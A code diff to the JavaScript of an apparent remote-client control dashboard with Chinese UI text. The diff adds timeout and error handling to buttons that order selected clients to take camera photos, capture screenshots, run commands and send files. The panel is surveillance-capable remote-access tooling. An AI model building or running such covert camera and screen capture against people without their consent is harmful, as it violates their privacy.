@@ -905,6 +905,7 @@
         let executingClients = { shoot: null, screenshot: null, execute: null };
         let activeTransferId = null;
         let activeTransferStage = null;
+        let actionTimeouts = { shoot: null, screenshot: null };
 
         // DOM Elements
         const targetClient = document.getElementById('targetClient');
@@ -1278,6 +1279,15 @@
             
             executingClients.shoot = null;
             executingClients.screenshot = null;
+
+            if (actionTimeouts.shoot) {
+                clearTimeout(actionTimeouts.shoot);
+                actionTimeouts.shoot = null;
+            }
+            if (actionTimeouts.screenshot) {
+                clearTimeout(actionTimeouts.screenshot);
+                actionTimeouts.screenshot = null;
+            }
             
             const shootBtn = document.getElementById('shootBtn');
             const screenshotBtn = document.getElementById('screenshotBtn');
@@ -1285,6 +1295,31 @@
             shootBtn.innerHTML = '📷 拍摄照片';
             screenshotBtn.disabled = false;
             screenshotBtn.innerHTML = '🖥️ 抓取屏幕';
+        });
+
+        socket.on('action_error', function(data) {
+            if (!data) return;
+            const clientId = data.client_id;
+            const action = data.action;
+            if (action === 'shoot' && executingClients.shoot && clientId && executingClients.shoot !== clientId) return;
+            if (action === 'screenshot' && executingClients.screenshot && clientId && executingClients.screenshot !== clientId) return;
+
+            if (action === 'shoot') executingClients.shoot = null;
+            if (action === 'screenshot') executingClients.screenshot = null;
+
+            if (actionTimeouts[action]) {
+                clearTimeout(actionTimeouts[action]);
+                actionTimeouts[action] = null;
+            }
+
+            const shootBtn = document.getElementById('shootBtn');
+            const screenshotBtn = document.getElementById('screenshotBtn');
+            shootBtn.disabled = false;
+            shootBtn.innerHTML = '📷 拍摄照片';
+            screenshotBtn.disabled = false;
+            screenshotBtn.innerHTML = '🖥️ 抓取屏幕';
+
+            showMessage(controlMessage, `${action === 'shoot' ? '拍摄' : '抓取'}失败: ${data.error || '未知错误'}`, 'error');
         });
 
         socket.on('command_result', function(data) {
@@ -1416,7 +1451,7 @@
             
             showMessage(fileMessage, '文件准备就绪，开始下载...', 'success');
             const a = document.createElement('a');
-            a.href = data.url;
+            a.href = new URL(data.url, window.location.href).toString();
             a.download = data.filename;
             document.body.appendChild(a);
             a.click();
@@ -1460,11 +1495,23 @@
         // Dashboard Controls
         document.getElementById('shootBtn').addEventListener('click', function() {
             const clientId = targetClient.value;
-            this.disabled = true;
-            this.innerHTML = '<span class="loading"></span> 发送中...';
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> 发送中...';
+            executingClients.shoot = clientId;
+
+            if (actionTimeouts.shoot) clearTimeout(actionTimeouts.shoot);
+            actionTimeouts.shoot = setTimeout(() => {
+                if (executingClients.shoot === clientId) {
+                    executingClients.shoot = null;
+                    btn.disabled = false;
+                    btn.innerHTML = '📷 拍摄照片';
+                    showMessage(controlMessage, '拍摄超时：未收到客户端上传结果', 'error');
+                }
+            }, 30000);
             
             $.ajax({
-                url: '/shoot',
+                url: 'shoot',
                 method: 'POST',
                 contentType: 'application/json',
                 data: JSON.stringify({ client_id: clientId }),
@@ -1472,6 +1519,13 @@
                     showMessage(controlMessage, '拍摄指令已发送，等待照片上传...', 'info');
                 },
                 error: function() {
+                    if (actionTimeouts.shoot) {
+                        clearTimeout(actionTimeouts.shoot);
+                        actionTimeouts.shoot = null;
+                    }
+                    executingClients.shoot = null;
+                    btn.disabled = false;
+                    btn.innerHTML = '📷 拍摄照片';
                     showMessage(controlMessage, '拍摄指令发送失败', 'error');
                 }
             });
@@ -1479,9 +1533,20 @@
 
         document.getElementById('screenshotBtn').addEventListener('click', function() {
             const clientId = targetClient.value;
-            this.disabled = true;
-            this.innerHTML = '<span class="loading"></span> 发送中...';
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> 发送中...';
             executingClients.screenshot = clientId;
+
+            if (actionTimeouts.screenshot) clearTimeout(actionTimeouts.screenshot);
+            actionTimeouts.screenshot = setTimeout(() => {
+                if (executingClients.screenshot === clientId) {
+                    executingClients.screenshot = null;
+                    btn.disabled = false;
+                    btn.innerHTML = '🖥️ 抓取屏幕';
+                    showMessage(controlMessage, '抓取超时：未收到客户端上传结果', 'error');
+                }
+            }, 30000);
             
             socket.emit('take_screenshot', { client_id: clientId });
             showMessage(controlMessage, '屏幕抓取指令已发送，等待上传...', 'info');
